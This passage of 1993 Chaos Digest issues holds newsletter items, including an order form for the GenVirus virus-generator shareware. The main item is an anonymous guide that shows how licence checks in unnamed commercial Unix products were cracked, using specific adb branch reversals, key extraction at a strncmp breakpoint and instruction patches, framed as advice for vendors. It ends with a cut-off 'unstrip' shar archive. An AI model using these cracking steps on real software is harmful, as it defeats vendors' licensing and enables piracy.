lancement de GENVIRUS.























         DOCUMENTATION de GENVIRUS V2.00    Page :   26
--





                                BON de COMMANDE                     GV1.5

  Mr : ..............................     Commande ...  exemplaire(s) du
                                          programme GenVirus avec licence
  Adresse : .........................     au format:

            .........................     [] 5 1/4          [] 3 1/2

    Ville : .........................         au prix unitaire de :
                                            130Frs           130Frs

  Je declare avoir pris connaissance des restrictions et avertissements
   lies a l'utilisation du programme, ne pas m'en servir dans
   l'intention de nuire, et l'exploiter uniquement pour mon usage
   personnel.


       Fait a .............. le .........  signature:

(lieu, date et signature sont obligatoires)

Adresser ce bon (ou une copie) ainsi que votre reglement (uniquement par
  cheque) a :

J. STRUSS     82, route de Reutenbourg     67440 LOCHWILLER     FRANCE

































            DOCUMENTATION de GENVIRUS V2.00    Page :   27
--
[ChaosD: This software (in shareware version) is freely available on the nice
Zoulou's BBS: +33 1 88 95 56 06. Mr. Geoffrey Reversat, sysop is reachable
between 19:30 and 22:00 GMT. Access by the only node by 1,200 through 38,400
bps modem].

------------------------------

Date: Wed Jun 16 08:38:43 +0200 1993
From: gelessus@res.enst.fr (Steffen Gelessus )
Subject: File 2--_Netz-Tage '93 (NeT)_ (annonce)
Forwarded from: terra@sol.ccc.de (Frank Simon )


                 N e t z - T a g e  ' 9 3 (NeT)

           27. August (14 Uhr) bis 29. August (17 Uhr)

   Congress fuer Datenreisende und solche die es werden wollen


Allgemeines -----------------------------------------------------

Vom 27. bis zum 29. August finden in Kiel erstmalig die Netz-Tage
statt. Auf diesem Congress sollen technische, administrative,
juristische und soziale Themen im Bereich der Informations- und
Kommunikationstechnik vorgestellt und diskutiert werden.

Der Congress wendet sich an alle, die sich fuer Computer und Netze
interessieren.

Veranstaltet werden die Netz-Tage vom Toppoint Mailbox e.V.,
Kiel, dem Individual Network e.V., Oldenburg, dem Chaos Computer
Club e.V., Hamburg und dem Freien Telekommunikations-Zentrum
Hamburg e.V. in Zusammenarbeit mit der Hochschulgruppe "Elektro-
nische Netzwerke und Kommunikation" der Universitaet Kiel, der
Fachschaft Mathematik/Informatik/Logik, Universitaet Kiel, der
DFN-Nutzergruppe "Studierende" sowie dem Datenschutzbeauftragten
des Landes Schleswig-Holstein.


Inhalte ---------------------------------------------------------

Der Congress wird aus mehreren Veranstaltungsbloecken bestehen.

Der Block  " N e t z e  &  R e c h t "  beschaeftigt sich mit dem
Fernmelderecht, dem Datenschutzrecht und der rechtlichen Einord-
nung von Mailboxen. Auch Fragen nach dem Sinn und Unsinn von
Urheber-, Patent- und Namensrecht werden in eigenen Veranstaltun-
gen angesprochen. Diese Themen sind durch die Schwierigkeiten des
"Rainbow BBS" wieder aktuell geworden! In diesem Zusammenhang
wird derzeit eine Diskussion ueber die eventuelle Gruendung eines
M a i l b o x s c h u t z b u n d e s  vorbereitet. Dazu wird es
noch gesonderte Informationen geben. Der Datenschutzbeauftragte
des Landes Schleswig-Holstein wird einen Vortrag ueber die prak-
tische Durchfuehrung von Datenschutzpruefungen berichten und an-
schliessend zusammen mit Hacksen und Hackern, Datenreisenden und
privaten Institutionen ueber die Moeglichkeit einer Zusammenar-
beit bei solchen Pruefungen diskutieren.

Im Block  " G r u n d s a e t z l i c h e s "  wird Prof. Gross-
mann vom Umweltforschungszentrum Leipzig ueber die Frage sprechen,
inwieweit Hacker und Viren als Motor von Entwicklungen dienen.
Wissenschaftler werden ueber die Verantwortung des Computer-Freaks,
Mailboxbetreibers oder Informatikers diskutieren. Prof. Gorny
(Universitaet Oldenburg) gibt eine Einfuehrung in "Software-
Ergonomie" und wird anschliessend in einem Arbeitskreis mit
Programmierern ueber die praktische Bedeutung und Umsetzung von
Netzanwendungen diskutieren. Auch eine Diskussion ueber den alten
Gedanken des "Globalen Dorfes", und was daraus geworden ist, wird
nicht fehlen!

Natuerlich werden auch  " T e c h n i k  &  B e n u t z e r "
nicht vernachlaessigt. Es wird eine Einfuehrung in Sinn und Be-
trieb des "Domain Name Service" geben, und eine Einfuehrung in
die Installation und den Betrieb von Linux. Weiterhin wird ueber
Verschluesselungstechniken und ihre Grenzen berichtet. "MIME",
"X.400", "RFC", "ModaCom" sollen nach diesem Congress fuer die
Teilnehmer keine Fremdworte mehr sein. Desweiteren sollen nach
ueber einen Jahr die Folgen des EMMA-Artikels diskutiert werden.
Schliesslich wird die Forschungsgruppe "Medienkultur und Lebens-
formen", Universitaet Trier die Ergebnisse ihrer Umfrage
"Netzwerk 92/93" vorstellen.

" T r e f f e n  &  I n f o r m a t i o n "  stehen wie selbst-
verstaendlich auf der Tagesordnung. Im Rahmen des Congresses
werden sich das Individual Network (IN), die DFN-Nutzergruppe
"Studierende", die diversen Projekte zur Vernetzung von Schulen
(Offenes Deutsches Schulnetz, PLUTO, Niedersaechsisches Schulnetz,
ComPaed etc.) zum Erfahrungsaustausch treffen. Gleiches gilt fuer
Projekte zur Vernetzung im Umweltschutzbereich (MUT, APC, CL).
Vielleicht entstehen neue gemeinsame Projekte?

Im Block  " N a t i o n a l e   I n f r a s t r u k t u r " wird
die Telekom ueber ihre Angebote berichten. Dabei soll ueber die
Frage gesprochen werden, wie eine nationale Datenkommunikations-
Infrastruktur fuer Privatpersonen technisch und rechtlich moeg-
lich ist, um so auf das (teure) Telefonnetz verzichten zu koen-
nen. Verschiedene Dienst-Anbieter, Vereine fuer private Netznut-
zung und Vertreter der Telekom werden in einen Arbeitskreis da-
rueber diskutieren.

Darueberhinaus wird der CCC Ulm ueber studentische Netzzugaenge
berichten. Die Nutzergruppe "Studierende im DFN" wird Projekte
vorstellen, die Studentenwohnheime direkt an die Universitaets-
netze anschliessen. Die Congress-Redaktion der Netz-Tage wird
mittels E-Mail den direkten Kontakt zu einer daenischen Tageszei-
tung herstellen und so den praktischen Einsatz von Netzen in der
Redaktionsarbeit demonstrieren (und hoffentlich dabei noch Zeit
finden, den  T a g u n g s b a n d  fertigzustellen).

Zum Abschluss der Netz-Tage ist ein Streitgespraech zwischen
Prof. Joseph  W e i z e n b a u m  (MIT), Prof. Robert  J u n g k
(Publizist und Zukunftsforscher) und  Wau  H o l l a n d  (CCC)
ueber die Moeglichkeiten und Folgen des Einsatzes moderner Kommu-
nikationstechnik in der Gesellschaft geplant. Beispiel wird die
Nutzung von NotePads, Multimedia und Funknetzen in einem Kranken-
haus des Jahres 1997 sein.

Anmerkung: Von einigen Referenten haben wir vorlaeufige Zusagen.
Aenderungen des Programms sind daher moeglich.


Ausstellung und Technik-Center ----------------------------------

Es wird auf den Netz-Tagen '93 eine Ausstellung bzw. ein Technik-
Center geben. Vereine und Einzelpersonen koennen dort ihre Lei-
stungen oder Ideen praesentieren. Weiterhin wird auch Zugang zu
Mailboxen und der weiten (Netz-)Welt realisiert. Wer hier etwas
beisteuern moechte, ist herzlich willkommen und wende sich bitte
r e c h t z e i t i g  an die Adresse  "raider@tpki.toppoint.de",
denn der verfuegbare Platz und die Anzahl der Telefonanschluesse
sind begrenzt.


Cafe & Uebernachtung --------------------------------------------

Zur Entspannung und Erfrischung wird es ein Cafe geben. Ebenfalls
wird ein Archiv mit Materialien aus der Computer-Szene vorhanden
sein. Ein Fotokopierer steht dort zur Verfuegung.

Eine Liste von Uebernachtungsmoeglichkeiten wird mit dieser
Congress-Ankuending verbreitet. Ein Themenfahrplan und genauere
Informationen zum Ablauf der Veranstaltung werden Ende Juli in
allen Netzen verbreitet werden.

Ausserdem ist am Freitag abend (22 Uhr) eine Fete in einer
Kieler Lokalitaet geplant. Ausserdem ist am Sonntag frueh (9 Uhr)
Fruehstueck auf dem Congressgelaende angesagt.


***  Es sind noch weitere Themen vorgesehen, die jedoch nur   ***
***  dann realisiert werden koennen, wenn noch weitere akti-  ***
***  ve Mitarbeiterinnen und Mitarbeiter zu uns stossen. Als  ***
***  Veranstalter der Netz-Tage '93 hoffen wir auf Eure Mit-  ***
***  arbeit fuer weitere Vortraege, Diskussionen und Arbeits- ***
***  kreise! -Keine ungerechtfertigte Scheu!- Wenn Ihr Vor-   ***
***  schlaege oder Anfragen habt, so richtet sie bitte an     ***
***  net-antwort@sol.ccc.de  oder  net-antwort@sol.zer        ***
***                                                           ***
***                 Wir freuen uns auf Euch!                  ***


Veranstaltungsort und Preise ------------------------------------

U n i v e r s i t a e t  K i e l
Veranstaltungstrakt der Mathematik & Informatik
Ecke Olshausenstrasse, Westring
Bus-Linie 2, 12, 22 und 41 vom Bahnhof

Tageskarten     DM 20,--  (Samstag),
                DM 15,--  (Freitag oder Sonntag)
Dauerkarte      DM 45,--
Vorkasse        DM 40,--  (nur als Dauerkarte)

Bei Vorkasse ist die Teilnahmegebuehr zu ueberweisen auf das
Konto  Martin Seeger, Sonderkonto NeT,
       Vereins- und Westbank Kiel
       BLZ. 21030000
       Kto. 91/050922

Bitte Namen und Anschrift angeben. Den Einzahlungsbeleg bitte zum
Congress mitbringen.

+----------------------------------------------------------------------------+
!Frank Simon (Terra), Ammerlaender Heerstr. 389, W2900 (26129) Oldenburg, FRG!
!               terra@sol.ccc.de, terra@sol.zer, +49 441 76206               !
!  Das war eine Aussage unter 4 Augen. Nein, unter 20 Fingern. (H. Henseler) !
+----------------------------------------------------------------------------+

------------------------------

Date: Wed Jun 16 10:48:54 -0400 1993
From: NRCGSH@RITVAX.ISC.RIT.EDU ("Prof Norm Coombs (716) 475-2462" )
Subject: File 3--Dictionnaire tres special pour PC (logiciel)

                     PC DICTIONARY a helpful tool.

     I received a complimentary copy of this dictionary for a pc.  It is
aimed for a special market with special though limited features.  Most
visually impaired persons have very limited dictionary access.  I do
have a braille dictionary in my office.  It takes seven very large
braille volumes, and it is actually called, "American Vest Pocket
Dictionary"  Now you can have a dictionary either on your hard drive, on
a 720 k floppy or 2 360 k floppies.  I was originally confused by its
not having many simple words like "tea" or "coffee".  However, to save
space, it ommits words that users ought to know and has a focus on
helping people develop their vocabulary and find words they are less
familiar with.  The definitions are short.  It also tries to familiarize
you with word roots which are also helpful in vocabulary building.

     I was pleased with its speed of operation, and its compactness
means you can afford to put it on your laptop.  Below is part of an
official description and an email address where you can find more
information.


     *  Comprehensive Data Base:  The PC DICTIONARY-10 has
        over 64,000  most frequently used words.  It lists
        definitions, synonyms, parts of speech,  word-root
        definitions, and inflected forms of words.
     *  A list of 800 word roots that will allow you to unlock
        the  meanings  of about  40,000 words that are de-
        rived from  these roots.  It is the only dictionary
        that enables the users to  master word roots without
        any knowledge of Latin/Greek.
     *  Menu Driven --  all you need to do is load and go.
        It enables you to get access to words/definitions
        with a few keystrokes.  You need to enter only the
        first few letters of the word you are looking up!
     *  Excellent Value: For a blind user, PC Dictionary-
        10 can replace a Braille dictionary, which comes
        in 40 volumes and costs about $800!
        For a sighted PC user,  a  printed dictionary with
        word origins costs about $100.  Priced at $50,
        PC Dictionary-10 is a great bargain!
     *  An excellent tool to prepare for SAT, ACT, and GRE
        verbal tests: PC Dictionary-10 is designed for these
        purposes -- it is the only electronic dictionary on
        the market that has the capability to print out the
        selected words/definitions!
     *  Average Response Time: 0.4 sec.
     *  Memory Requirement: 55 KB. (Not memory-resident.);
        68 KB. (TSR mode); free disk-space required: 700 KB.
     *  Hardware Requirements: Two floppy disk drives or one
        hard disk drive; it works with IBM PC & compatibles.
     *  Recommended by the National Library Service for the
        Blind and Physically Handicapped.
     *  Received excellent reviews from the Computer Shopper
        (May 1990) and the PCM Magazine (Feb. 1991).
     *  All orders come with 30-day money-back guarantee.

*Address:  Edicom Systems, 19785 W. 12 Mile Rd., Southfield, MI 48076
           INTERNET:  ewpo@gatecom.com     Phone:  1-(313)-541-8889 (voice)

------------------------------

End of Chaos Digest #1.56
************************************

Chaos Digest             Dimanche 20 Juin 1993        Volume 1 : Numero 57
                            ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.57 (20 Juin 1993)
File 1--Guerilla dans les logiciels Unix (licence)
File 2--Djinn unie France Telecom et IBM France (produit)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Mon Jun 14 12:53:35 GMT 1993
From: user@anonymous.edu
Subject: File 1--Guerilla dans les logiciels Unix (licence)


                 Guerilla Guide to Licensing Software

                          DRAFT VERSION 0.1

Abstract

This short article discusses some of the weaknesses of various licensing
schemes to control the use and distribution of Unix software. In particular,
examples will be given of actual commercial products which can be "cracked"
with a minimum of effort. The intention is to provide some observations which
will be of use to implementers and designers of software or those integrating
licence managers into their products.

DISCLAIMER: I am not recommending that you steal software. The purpose of this
article is to point out to vendors to weaknesses of the schemes they use.
Please do not use this information for illegal purposes.

For obvious reasons the author of this document wishes to remain anonymous.


Network licence servers or node locked licences have become very popular in
the Unix world over the last few years. Most vendors now use them, as they
provide an easy means to control the use and distribution of commerical
software with a minimum of customer inconvenience. Unfortunately many of these
provide a false sense of security for the vendor in that any skilled "cracker"
can break the scheme thus turning a demonstration version into an unauthorised
unlimited licence version or adding licences to an already purchased version.

In particular, many vendors provide demonstration versions of software which
either have expiry dates (fully functional short term licences) or have
limited functionality. This approach is inherently weak in that it is usually
possible to convert this demonstration version into a fully functional long
term version. Vendors like this sort of scheme because a customer can call up
and purchase the product, and have a licensed version immediately, if he/she
has a demonstration version, say from a CD-ROM library of demonstration
programs. However, in this case, the demonstration version will undoubtedly
be distributed to a lot of potential customers. From the vendor's point of
view, the sort of "cracking" which turns a demonstration version into a
"real" version is probably a more serious problem that "cracking" to gain
extra licences.

I'm going to start with a brief overview of the methods most of these products
use to generate licences. Most of the schemes use some sort of cryptogra-
phically strong hash function to give a level of security. Examples of these
are MD2, MD4, MD5, Snefru and the NIST Secure Hash Standard (FIPS-180). These
hash functions all have the property that it is computationally difficult to
determine the input given the output or to determine two outputs which hash to
the same value.  The security of the system usually relies on the secrecy of
the hash function used and the difficulty of inverting that function.

   a) Node-locked licences.

      These are licenses to run a certain number of copies of a product on a
single computer. Usually some sort of unique host identifier is hashed
together with the number of licences, expiry date, and possibly some customer
identification information (company name &c.). The host identifier and number
of licences are stored in plaintext together with the hash value, e.g.:

               hostid 66777777
               hostname foo
               licences 7
               key 4f4c998319b26020a20ed60e146c7d60

For our example the hash function is a function H of hostid, hostname and
licenses, probably constructed using the composition of some simple string
manipulation and either one of the "secure" hash functions mentioned above
or perhaps a hash function designed by the licensing software vendor.

The vendor, given the hostid, hostname and licences, computes

               H(hostid,hostname,licences)

and gives this to the customer upon purchase.  The product would check the
hash value by computing H(hostid,hostname,licenses) and checking that value
against the licence key. If they don't match, a violation is detected and
presumably the product will not function correctly. In our specific example
if an unscrupulous customer changes the value to "licences" to 8, the key
the product computes will not match the key value given by the vendor and
a violation will be detected.

Now, you might ask, "why is this system inherently weak?". Well, the answer
is sort of obvious, if our unscrupulous user could monitor the execution of
the program in order to find out what the key should be given altered
licensing data, then he/she could "crack" the system.  If a demonstration
version has an expiry date, this sort of scheme might allow someone to change
this date and therefore have access to a "real" version of the product.

   b) Floating licences:

      Are essentially very similar. A licence server runs on a host or set
of hosts. The verification of the key is usually done by the server on
startup. Some sort of protocol (which might include encryption) is used for
client-server communications.

The attacks I give below will involve actual modification of the product in
question. None of them took over four hours (and I'm not a particularly
talented hacker).

As an aside, an obvious solution to the above would be the use of public key
methods. There are two obvious problems here, the first being that all such
methods are patented and thus the user would have to pay a license fee.  The
second is that digital signature algorithms often would produce keys that are
much too large for the average user to type in. Clearly a 128 byte key (256
hex digits) would be acceptable to most customers, but if you use something
like RSA to sign your licensing information, you are looking at something on
that scale.

Types of attacks:

1. Bypass the licensing routines altogether;
2. Run the licensing routine but change its return value;
3. Determine what the licence key "should be" given the other (altered)
   licensing data;
4. Change the values of certain interesting variables.

The attacks I'll discuss will involve the use of some sort of debugger.
The appropriate debugger often depends on the system you are working with.
Usually lower level debuggers are better as little or no symbolic
information will be available (most vendors strip binaries). However, in many
cases if the product is dynamically linked, you can "unstrip"  the relevant
programs to restore much of the symbolic data. Obviously  you are ahead if
there is a routine called check_licence() and you know  when and where it is
called, you have some useful information to attack the product. (an unstrip
program for sun os 4.1 is included with this file. The same sort of thing
works under AIX 3.2 and Solaris 2.x, for  example).

So for licence software designers and integrators.

I. First principle
+------------------

Obscure symbolic information:
* Strip your binaries.
* Statically link if possible.
* If you can't statically link, try and obscure the symbol names. One
  way to do this is to obfuscate all of the symbol names in your
  distribution version. (opqcp available in comp.sources.misc vol 13 is
  a useful tool for this, some might argue that using C++ is enough ;-) ).

The sample attacks will explain some obvious avenues of attack.  The product
names will be changed to protect the vendors in question.

     EXAMPLE 1
     Product A, Sun 4, SUN OS 4.1.1

Product A is a nifty tool. The vendor will send you a demo version
if you call and ask. The demo version is fully functional, but will
expire after a couple of weeks.

Step 1 is to unstrip (indeed this one is dynamically linked).

Step 2. Change the expiry date in the licence file from 31-Dec-1992
to 31-Dec-1999 (now the key won't match what the vendor would have given
us if he/she had given us that expiry date).

A little work with adb reveals the following:

product A forks before it checks the licensing information. The child
does all the work.

So, step 3, reverse the sense of the test after the fork.

The source code (which we don't have) looks something like:
if (fork()) {
    /* parent - just die */
    exit(0);
}
else {
    /* child - do the work */
}

So, we try and reverse the test. The resulting binary won't work properly
of course, but the point is to get some information on how things work.

So we:
cp product_a product_a_hacked_version
adb -w ./product_a_hacked_version
0x2664  - reverse the sense of this test.
i.e.
change
_main+0x30:     be,a    _main + 0x40
to
_main+0x30:     bne,a   _main + 0x40

e.g. you might do this by
0x2664?w 3280


It turns out (this is too easy), if you set a breakpoint on strncmp
after doing this, you will find that (on the first call to strncmp) one
of the parameters contains the value of the key from the licence file and
one of them contains the value the key should have.

One can then proceed by changing the key in the licence file. In this
case, I could change the expiry date to some date in 1999.


4> adb ./product_a_hacked_version
strncmp:b
:r 0 1 ./product_a_hacked_version
SIGCHLD 20: child status change
stopped at      _isatty+0x98:   bgeu    _isatty + 0xc0
:c 0
breakpoint      _strncmp:       save    %sp, -0x60, %sp
:s
stopped at      _strncmp+4:     call    __DYNAMIC + 0x60
:s
stopped at      _strncmp+8:     sethi   %hi(0xb000), %g0
$C
_strncmp(0x11330,0x157dc,0x14,0xf7fff314,0xf7fff314,0x63) + 8
_lm_checkout(0xe3f8,0x3ff00000,0x0,0x1,0x0,0xe3b0) + a60
_lm_checkout(0xe3f8,0x3ff00000,0x0,0x1,0x0,0xe3b0) + dc
_main(0x4,0x0,0x0,0x1,0x0,0x834) + 29c
0x11330?s
__mb_cur_max+0x1fc:             5AA6DC71361F95E20D1C

and yes, this is the required key value.

("too easy" you say, this product sells for over $2000 per licence!).

Indeed, the "unhacked" version runs nicely with the key and expiry date in
the new licence file. You might say that the vendor was singularly stupid,
but strangely enough, this sort of thing is very common.


II. Second Principle
+--------------------

Fully functional date locked demonstration versions are dangerous things.


III. Third Principle
+--------------------

Lock a smart hacker who knows nothing about the internals of your product
(new employees can be good for this) in a room with your product for a day
and see if he/she can crack it. Certainly this sort of  thing is standard
practice in the design of cryptosystems.


IV. Fourth Principle
+--------------------

Try and obscure the functioning of your licensing code.



     EXAMPLE 2
     The case of product B

I'm going into somewhat less detail here because this is in a way similar
to product A. Product B is statically linked :-(
Product B is another nifty tool selling for >$1000 per license.

The vendor will give you a date locked fully functional version.
If the licence key is not verified (expired or whatever), product
B comes up in demonstration mode which has restricted functionality.

The mode (demonstration or licenced) is controlled by a single boolean
variable (integer value 0 or 1). This variable is checked when
someone tries one of the restricted functions, and the user
is either permitted to perform the function or not based on the
value of this variable.

The way to crack this, of course, was to insert an instruction near
the end of the licensing code which set the data location to the value 1.

Clues:
1. Whenever a restricted function was performed that address was accessed.
   It wasn't accessed otherwise after the initial startup;
2. Value of 0 or 1 was a dead giveaway. A pointer to a string might have
   been a better choice for the value of TRUE.


     EXAMPLE 3
     The case of product C

Product C is less expensive than either of the above. It was somewhat
harder to crack. Product C is also statically linked :-( We start
working from the case where there is an expired demonstration licence.

We use adb again. The following steps do the trick.

1. Locate main;
2. Find the call directly from main which prints out a message which
   indicates that the licence file is invalid;
3. proceed down the "tree" of calls to find the lowest level routine
   which prints this message. A little trial and error shows the conditional
   branch which determines if a key is valid in this routine. Note that
   this happens just after getimeofday is called!

            or      %o2, 0x57, %o2
            mov     0x5, %o0
            call    0x412c8
            nop
            ba      0x69e18
            clr     %i3
            ld      [%o5 + 0x37c], %o5
            andcc   %o5, 0x2, %g0
            be,a    0x69e24
            orcc    %g0, %i3, %g0
            call    0x13af50  - this calls gettimeofday(2)
            clr     %o0
            ld      [%i5 + 0x10], %o7
            cmp     %o7, %o0
0x69e08     bl,a    0x69e24     (originally bgeu,a 0x69e24)
            orcc    %g0, %i3, %g0
            mov     0x1, %l2
            clr     %i3
            clr     %i0

Now the expired demo license will serve as a perpetual demo licence.
The demo version is fully functional

Now the expired demo license will serve as a perpetual demo licence.
The demo version is fully functional


     EXAMPLE 4
     The case of product D

Product D is statically linked.

We can bypass the licence routine completely by replacing the call to it with
a nop. The folling is an RS6000 exmaple.

0x10018444 (???) 4818e101         bl   0x101a6544 (???)
replace this with 38600000  lil r3,0

again we could determine the routine of interest by finding out which routine
printed the violation message when there was no licence.

Another option in this case was to insert a return instruction just after the
call to the licence routine (which incidentally calls gethostid first thing
and later displays a message about not being able to get a licence).

- From this we might observe, two related principles.


V. Fifth Principle. Modularity is a bad thing
+---------------------------------------------

If someone can subvert your code by altering one routine or changing one
variable, then the code is vunerable. Software engineering practice would
seem to dictate that you should have one routine or small set of routines
where all of the licensing code resides. However, this sort of approach is
inherently insecure. For instance in the above the routine which prints the
message indicating a licensing violation was the routine which verified the
licensing data. It would have been much better to seperate the two.


VI. Sixth Principle
+-------------------

When you write code for the licensing system, make  sure that it can't be
easily subverted by changing any one single  instruction. Program defensively.
Check often for licence violations.  Duplicate all the "check" code if
necessary, so that the subversion of  a single routine will not sucessfully
crack the system. If the cracker has to simultaneously modify three or more
instructions/variables, cracking is significantly harder.

Certainly it is impossible to make your system unbreakable. Consider in all
of the above, a somewhat experienced hacker could crack the system in less
than four hours. The goal of the implementor should be to design the licensing
components in a sufficiently convoluted way so that much more effort is
needed.


                                   APPENDIX

                        Unstrip for Sun 4/sun os 4.1.1

+++++
From: pk@cs.few.eur.nl (Paul Kranenburg)
Newsgroups: alt.sources
Subject: unstrip a stripped dynamically linked executable.
Keywords: dynamic linking, debugging
Message-ID: <1992Jan22.161325.22872@cs.few.eur.nl>
Date: 22 Jan 92 16:13:25 GMT
Sender: news@cs.few.eur.nl
Reply-To: pk@cs.eur.nl
Organization: Erasmus University Rotterdam
Lines: 1319

Ever found the odd core file lying around in your root directory
and discovered that it was dropped by some system supplied daemon
which didn't even contained a name list?

If this happens on SunOS 4.x system (and it certainly does happen on
ours) and the executable is dynamically linked (as most of them are)
you may at least be able to get a decent traceback with adb(1)
after forcing the necessary symbolic information into the open
again.

This is the purpose of the enclosed programme, which takes advantage
of the fact that the run-time linker (ld.so) needs the same symbolic
information to perform its task and is therefore included in
the executable's text segment by its companion, ld(1).

Quote from README:

"Information for the run-time linker is stored in an executable's text
and data segment. This includes a symbol- and string table in standard
(a.out) format. Careful examination of the  header file and
tracing of some simple dynamically linked programs reveal the intrinsics
of the run-time link process, enabling the extraction of the symbol
table and putting it back on the spot where it used to be before
the executable was stripped."


Cheers, Paul.

--------------------------------------------------------------------------
#! /bin/sh
# This is a shell archive.  Remove anything before this line, then unpack
# it by saving it into a file and typing "sh file".  To overwrite existing
# files, type "sh file -c".  You can also feed this as standard input via
# unshar, or by typing "sh 'Makefile' <<'END_OF_FILE'
X#
X# @(#)Makefile 1.2 92/01/22
X#
XBINDIR=/usr/local/bin
XMANDIR=/usr/local/man/man1
XCC=cc
XCFLAGS=-O
XOBJS=util.o
XKIT=   Makefile README unstrip.1 nmd.1 defs.h util.c unstrip.c nm.c
X
Xall: nm unstrip
X
Xnm: nm.o $(OBJS)
X   $(CC) $(CFLAGS) -o $@ nm.o $(OBJS)
X
Xunstrip: unstrip.o $(OBJS)
X   $(CC) $(CFLAGS) -o $@ unstrip.o $(OBJS)
X
Xd2o: d2o.o $(OBJS)
X   $(CC) $(CFLAGS) -o $@ d2o.o $(OBJS)
X
Xinstall: nm unstrip
X   install -m 555 nm $(BINDIR)/nmd
X   install -m 555 unstrip $(BINDIR)
X
Xinstall.man: unstrip.1 nmd.1
X   install -m 444 unstrip.1 $(MANDIR)
X   install -m 444 nmd.1 $(MANDIR)
X
Xclean:
X   rm -f *.o a.out core nm unstrip d2o Part?? nm.tar.Z
X
Xkit: $(KIT)
X   makekit $(KIT)
X
Xtar: $(KIT)
X   tar cf - $(KIT) | compress > nm.tar.Z
X
Xnm.o: defs.h
Xunstrip.o: defs.h
Xd2o.o: defs.h
END_OF_FILE
if test 746 -ne `wc -c <'Makefile'`; then
    echo shar: \"'Makefile'\" unpacked with wrong size!
fi
# end of 'Makefile'
fi
if test -f 'README' -a "${1}" != "-c" ; then
  echo shar: Will not clobber existing file \"'README'\"
else
echo shar: Extracting \"'README'\" \(1634 characters\)
sed "s/^X//" >'README' <<'END_OF_FILE'
X@(#)README 1.2 92/01/22
X
Xunstrip - restore symbols and relocation bits in a dynamically
X     linked object file
X
Xnmd    - a nm(1) like programme that is capable of showing the name
X     list and relocation information of dynamically linked executables
X
X
XInformation for the run-time linker is stored in an executable's text
Xand data segment. This includes a symbol- and string table in standard
X(a.out) format. Careful examination of the  header file and
Xtracing of some simple dynamically linked programs reveal the intrinsics
Xof the run-time link process, enabling the extraction of the symbol
Xtable and putting it back on the spot where it used to be before
Xthe executable was stripped.
X
XFortunately, the "internal" symbol table still includes entries
Xof symbols that were already resolved by the static linking process,
Xprovided they carry the "external" attribute.
X
XThe mechanisms employed by the dynamic linker have been declared
Xvolatile by Sun (cf. link(5)), so these programs may stop working
Xat any moment (perhaps even without upgrading your OS :-).
X
XHowever, the SVR4 SPARC ABI specifies many items related to dynamic
Xlinking and also documents the relocation types which are nowhere to
Xbe found in SunOS 4.1.x documentation (most notably the RELOC_JMP_SLOT
Xtype that appears to define the relation of a symbol to the Procedure
XLinkage Table). If this extrapolates to SunOS 4.1.x, some hacks in
Xthese programs could be cleaned up.

------------------------------

Date: 19 Jun 93 13:59:59 GMT
From: ymcrabbe@email.teaser.com (Yves-Marie Crabbe )
Subject: File 2--Djinn unie France Telecom et IBM France (produit)
Repost from: telecom13.405.1@eecs.nwu.edu

           DJINN: the new French intelligent computer interface

Paris, France, June 19, 1993: France Telecom and IBM France have
teamed up for the first time to offer an innovative "communications"
personal computer known as Djinn.  The world's number four
telecommunications operator and the world leader in the computer
market have put their combined technical and marketing power behind
Djinn, a product whose state-of-the-art technology will make PC
communications as ubiquitous as desktop computers themselves.

Djinn is a fax, Minitel videotex terminal, answering machine and
powerful personal computer all in one.  The launch of this innovation
will drive development throughout the entire industry, since Djinn at
last creates direct integration of personal computer and
telecommunications environments.

Pre-development studies suring Djinn project have underlined a number
of important points:

   * Both professional users and consumers express spontaneous confidence
     in the quality of a PC-based telecoms product offered by France Telecom
     and IBM, two brand names with substantial "credibility capital";

   * The entire target population, from small businesses and professionals
     to managers in larger firms, expresses demand for both open solutions
     (acquisition of a single telecommunications device) and packaged
     solutions (telecommunications device bundled with a PC).

Consequently, both types of products will be marketed:

   * Djinn* is designed for connection to any PC equipped with Windows**.
     The product consists of a modem (developed by Com1) and software
     (developed by Integro) offering fax, Minitel videotext, answering
     machine and telephony functions.  The retail price is FRF3,990
     (excl. VAT);

   * The package product consists of the Djinn unit and an IBM PS/Value
     Point*** (386 SLC-25 MHz), sold for FRF12,000 (excl. VAT).

Both solutions will be sold by IBM dealers and by IBM's direct sales
network.

The Djinn unit will also be marketed by France Telecom subsidiary EGT
under the France Telecom Equipements brand name.
_____
* Djinn is a registered trademark of France Telecom.
** Windows is a registered trademark of Microsoft Corp.
*** PS/Value Point is a registered trademark of International Business
Machines.

Djinn: A communications genie in every computer

Djinn is the first PC-based solution for the Windows operating
environment with a single application that integrates telephone
applications: fax, answering machine and videotex terminal.  The
combination of these functions in a single unit ushers in a vast
improvement in the daily working environment.

